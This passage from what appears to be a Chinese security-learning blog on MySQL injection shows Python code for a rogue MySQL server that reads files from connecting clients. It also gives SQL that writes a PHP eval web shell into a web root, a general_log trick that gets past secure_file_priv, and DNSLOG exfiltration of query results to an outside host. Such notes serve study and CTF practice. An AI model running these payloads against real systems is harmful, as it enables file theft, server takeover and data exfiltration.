self.sub_state = &#x27;Auth&#x27;<br>        self.logined = False<br>        self.push(<br>            mysql_packet(<br>                0,<br>                &quot;&quot;.join((<br>                    &#x27;x0a&#x27;,  # Protocol<br>                    &#x27;3.0.0-Evil_Mysql_Server&#x27; + &#x27;&#x27;,  # Version<br>                    #&#x27;5.1.66-0+squeeze1&#x27; + &#x27;&#x27;,<br>                    &#x27;x36x00x00x00&#x27;,  # Thread ID<br>                    &#x27;evilsalt&#x27; + &#x27;&#x27;,  # Salt<br>                    &#x27;xdfxf7&#x27;,  # Capabilities<br>                    &#x27;x08&#x27;,  # Collation<br>                    &#x27;x02x00&#x27;,  # Server Status<br>                    &#x27;&#x27; * 13,  # Unknown<br>                    &#x27;evil2222&#x27; + &#x27;&#x27;,<br>                ))<br>            )<br>        )<br><br>        self.order = 1<br>        self.states = [&#x27;LOGIN&#x27;, &#x27;CAPS&#x27;, &#x27;ANY&#x27;]<br><br>    def push(self, data):<br>        log.debug(&#x27;Pushed: %r&#x27;, data)<br>        data = str(data)<br>        asynchat.async_chat.push(self, data)<br><br>    def collect_incoming_data(self, data):<br>        log.debug(&#x27;Data recved: %r&#x27;, data)<br>        self.ibuffer.append(data)<br><br>    def found_terminator(self):<br>        data = &quot;&quot;.join(self.ibuffer)<br>        self.ibuffer = []<br><br>        if self.state == &#x27;LEN&#x27;:<br>            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1<br>            if len_bytes &lt; 65536:<br>                self.set_terminator(len_bytes)<br>                self.state = &#x27;Data&#x27;<br>            else:<br>                self.state = &#x27;MoreLength&#x27;<br>        elif self.state == &#x27;MoreLength&#x27;:<br>            if data[0] != &#x27;&#x27;:<br>                self.push(None)<br>                self.close_when_done()<br>            else:<br>                self.state = &#x27;Data&#x27;<br>        elif self.state == &#x27;Data&#x27;:<br>            packet = mysql_packet.parse(data)<br>            try:<br>                if self.order != packet.packet_num:<br>                    raise OutOfOrder()<br>                else:<br>                    # Fix ?<br>                    self.order = packet.packet_num + 2<br>                if packet.packet_num == 0:<br>                    if packet.payload[0] == &#x27;x03&#x27;:<br>                        log.info(&#x27;Query&#x27;)<br><br>                        filename = random.choice(filelist)<br>                        PACKET = mysql_packet(<br>                            packet,<br>                            &#x27;xFB&#123;0&#125;&#x27;.format(filename)<br>                        )<br>                        self.set_terminator(3)<br>                        self.state = &#x27;LEN&#x27;<br>                        self.sub_state = &#x27;File&#x27;<br>                        self.push(PACKET)<br>                    elif packet.payload[0] == &#x27;x1b&#x27;:<br>                        log.info(&#x27;SelectDB&#x27;)<br>                        self.push(mysql_packet(<br>                            packet,<br>                            &#x27;xfex00x00x02x00&#x27;<br>                        ))<br>                        raise LastPacket()<br>                    elif packet.payload[0] in &#x27;x02&#x27;:<br>                        self.push(mysql_packet(<br>                            packet, &#x27;x02&#x27;<br>                        ))<br>                        raise LastPacket()<br>                    elif packet.payload == &#x27;x00x01&#x27;:<br>                        self.push(None)<br>                        self.close_when_done()<br>                    else:<br>                        raise ValueError()<br>                else:<br>                    if self.sub_state == &#x27;File&#x27;:<br>                        log.info(&#x27;-- result&#x27;)<br>                        log.info(&#x27;Result: %r&#x27;, data)<br><br>                        if len(data) == 1:<br>                            self.push(<br>                                mysql_packet(packet, &#x27;x02&#x27;)<br>                            )<br>                            raise LastPacket()<br>                        else:<br>                            self.set_terminator(3)<br>                            self.state = &#x27;LEN&#x27;<br>                            self.order = packet.packet_num + 1<br><br>                    elif self.sub_state == &#x27;Auth&#x27;:<br>                        self.push(mysql_packet(<br>                            packet, &#x27;x02&#x27;<br>                        ))<br>                        raise LastPacket()<br>                    else:<br>                        log.info(&#x27;-- else&#x27;)<br>                        raise ValueError(&#x27;Unknown packet&#x27;)<br>            except LastPacket:<br>                log.info(&#x27;Last packet&#x27;)<br>                self.state = &#x27;LEN&#x27;<br>                self.sub_state = None<br>                self.order = 0<br>                self.set_terminator(3)<br>            except OutOfOrder:<br>                log.warning(&#x27;Out of order&#x27;)<br>                self.push(None)<br>                self.close_when_done()<br>        else:<br>            log.error(&#x27;Unknown state&#x27;)<br>            self.push(&#x27;None&#x27;)<br>            self.close_when_done()<br><br>class mysql_listener(asyncore.dispatcher):<br>    def __init__(self, sock=None):<br>        asyncore.dispatcher.__init__(self, sock)<br><br>        if not sock:<br>            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)<br>            self.set_reuse_addr()<br>            try:<br>                self.bind((&#x27;&#x27;, PORT))<br>            except socket.error:<br>                exit()<br><br>            self.listen(5)<br><br>    def handle_accept(self):<br>        pair = self.accept()<br><br>        if pair is not None:<br>            log.info(&#x27;Conn from: %r&#x27;, pair[1])<br>            tmp = http_request_handler(pair)<br><br>z = mysql_listener()<br>daemonize()<br>asyncore.loop()<br></code></pre></td></tr></table></figure>
+
+<p><strong>4.写文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select 1,&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; into outfile &#x27;/var/www/html/1.php&#x27;;<br>select 2,&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; into dumpfile &#x27;/var/www/html/1.php&#x27;;<br></code></pre></td></tr></table></figure>
+
+<p>当secure_file_priv值为NULL时，可用生成日志的方法绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">set global general_log_file = &#x27;/var/www/html/1.php&#x27;;<br>set global general_log = on;<br></code></pre></td></tr></table></figure>
+
+<p>日志除了general_log还有其他许多日志，实际场景中需要有足够的写入日志的权限，且需要堆叠注入的条件方可采用该方法，因此利用非常困难。</p>
+<p><strong>5.DNSLOG（OOB注入）</strong></p>
+<p>若用户访问DNS服务器，则会在DNS日志中留下记录。如果请求中带有SQL查询的信息，则信息可被带出到DNS记录中。</p>
+<p>利用条件：</p>
+<p>1.secure_file_priv为空且有文件读取权限</p>
+<p>2.目标为windows（利用了UNC，Linux不可行）</p>
+<p>3.无回显且无法时间盲注</p>
+<p>利用方法：</p>
+<p>可以找一个免费的DNSlog：<a target="_blank" rel="noopener" href="http://dnslog.cn/">http://dnslog.cn/</a></p>
+<p>进入后可获取一个子域名，执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select load_file(concat(&#x27;\\&#x27;,(select database()),&#x27;.子域名.dnslog.cn&#x27;));<br></code></pre></td></tr></table></figure>
+
+<p>相当于访问了select database().子域名.dnslog.cn，于是会留下DNSLOG记录，可从这些记录中查看SQL返回的信息。</p>
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/15/YDHFRH.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/15/YDHFRH.png'><img src="https://s1.ax1x.com/2020/05/15/YDHFRH.png" alt="YDHFRH.png"></a></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2021/02/21/sortset/">← Next 排序Sort(代码与笔记)</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2021/02/16/heap/">优先队列(堆) Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/6.png" alt="Logo"></a><h1 id="Dr"><a href="TokameinE">TokameinE</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/ErodedElk"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/1782544616"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">一、基础注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.1.</span> <span class="toc-text">1.联合查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">2.报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.</span> <span class="toc-text">3.布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.4.</span> <span class="toc-text">4.时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text">5.HTTP头注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-HTTP%E5%88%86%E5%89%B2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.</span> <span class="toc-text">6.HTTP分割注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.</span> <span class="toc-text">7.二次注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-SQL%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB"><span class="toc-number">1.8.</span> <span class="toc-text">8.SQL约束攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%9F%BA%E7%A1%80%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">二、基础绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">1.大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.</span> <span class="toc-text">2.双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%B7%BB%E5%8A%A0%E6%B3%A8%E9%87%8A"><span class="toc-number">2.3.</span> <span class="toc-text">3.添加注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%BD%BF%E7%94%A816%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87%E7%89%B9%E5%AE%9A%E5%AD%97%E7%AC%A6"><span class="toc-number">2.4.</span> <span class="toc-text">4.使用16进制绕过特定字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%AE%BD%E5%AD%97%E8%8A%82%E3%80%81Latin1%E9%BB%98%E8%AE%A4%E7%BC%96%E7%A0%81"><span class="toc-number">2.5.</span> <span class="toc-text">5.宽字节、Latin1默认编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%90%84%E4%B8%AA%E5%AD%97%E7%AC%A6%E4%BB%A5%E5%8F%8A%E5%87%BD%E6%95%B0%E7%9A%84%E4%BB%A3%E6%9B%BF"><span class="toc-number">2.6.</span> <span class="toc-text">6.各个字符以及函数的代替</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E9%80%97%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-number">2.7.</span> <span class="toc-text">7.逗号被过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-limit%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-number">2.8.</span> <span class="toc-text">8.limit被过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-information-schema%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-number">2.9.</span> <span class="toc-text">9.information_schema被过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-and-or-%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-number">2.10.</span> <span class="toc-text">10.and or &amp;&amp; 被过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E7%89%B9%E5%AE%9A%E5%9C%BA%E6%99%AF%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">三、特定场景的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%A1%A8%E5%90%8D%E5%B7%B2%E7%9F%A5%E5%AD%97%E6%AE%B5%E5%90%8D%E6%9C%AA%E7%9F%A5%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text">1.表名已知字段名未知的注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-select%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-number">3.2.</span> <span class="toc-text">2.堆叠注入&amp;select被过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-PHP%E6%AD%A3%E5%88%99%E5%9B%9E%E6%BA%AFBUG"><span class="toc-number">3.3.</span> <span class="toc-text">3.PHP正则回溯BUG</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-PDO%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.4.</span> <span class="toc-text">4.PDO场景下的SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Limit%E6%B3%A8%E5%85%A5%EF%BC%885-7%E7%89%88%E6%9C%AC%E5%B7%B2%E7%BB%8F%E5%BA%9F%E9%99%A4%EF%BC%89"><span class="toc-number">3.5.</span> <span class="toc-text">5.Limit注入（5.7版本已经废除）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E7%89%B9%E6%AE%8A%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.6.</span> <span class="toc-text">6.特殊的盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B-%E6%96%87%E4%BB%B6%E7%9A%84%E8%AF%BB%E5%86%99"><span class="toc-number">4.</span> <span class="toc-text">四.文件的读写</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
